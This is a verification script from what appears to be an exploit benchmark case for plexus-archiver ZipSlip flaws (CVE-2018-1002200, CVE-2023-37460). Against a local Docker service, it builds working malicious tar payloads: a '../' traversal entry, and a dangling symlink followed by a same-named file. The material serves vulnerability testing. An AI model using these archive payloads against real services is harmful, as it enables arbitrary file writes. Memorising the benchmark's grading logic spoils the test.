#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0174 (plexus-archiver ZipSlip:
# CVE-2018-1002200 ../ entry -> CVE-2023-37460 dangling-symlink follow).
#
# Flag is the CONTENT of the uploaded tar payload (PCBFLAG_*).
# Probe embeds RUN_FLAG; judge uses RUN_FLAG_REF so wrong/stale overrides fail.
# Exit: 0=effect (flag echoed) 10=no effect 20=env failure 30=arg error
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 8080 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS --max-time 5 -o /dev/null -w '%{http_code}' \
      -X POST "http://127.0.0.1:${PORT}/extract" \
      -H 'Content-Type: application/x-tar' \
      --data-binary '' || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port /extract for $SVC:8080" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_X="$FLAG_REF"
export PCB_FLAG="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2018-1002200: plain regular-file entry named ../out/flag.
  # V0 3.5 writes outside dest; V1 3.6.0 canonical startsWith blocks it.
  # Rebuild tar with this run's RUN_FLAG (base64 hides PCBFLAG_ from text replace).
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'PY'
import base64, io, json, sys, tarfile
flag, p = sys.argv[1], sys.argv[2]
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as t:
    data = flag.encode("utf-8")
    ti = tarfile.TarInfo("../out/flag")
    ti.size = len(data)
    ti.type = tarfile.REGTYPE
    t.addfile(ti, io.BytesIO(data))
open(p, "w").write(json.dumps({
    "id": "cve-2018-1002200-dotdot-zipslip",
    "tar_b64": base64.b64encode(buf.getvalue()).decode("ascii"),
}))
PY
else
  # CVE-2023-37460 residual (inline, never heldout, never seed fallback):
  # entry1 symlink -> /work/out/flag, then same-name regular file with flag
  # content. V1 getCanonicalPath on the dangling link stays inside dest;
  # FileOutputStream follows the link and writes the witness.
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'PY'
import base64, io, json, sys, tarfile
flag, p = sys.argv[1], sys.argv[2]
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as t:
    link = tarfile.TarInfo("entry1")
    link.type = tarfile.SYMTYPE
    link.linkname = "/work/out/flag"
    t.addfile(link)
    data = flag.encode("utf-8")
    reg = tarfile.TarInfo("entry1")
    reg.size = len(data)
    reg.type = tarfile.REGTYPE
    t.addfile(reg, io.BytesIO(data))
open(p, "w").write(json.dumps({
    "id": "cve-2023-37460-dangling-symlink",
    "tar_b64": base64.b64encode(buf.getvalue()).decode("ascii"),
}))
PY
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == sys.argv[2] else 10)" "$OUT" "$FLAG_REF"
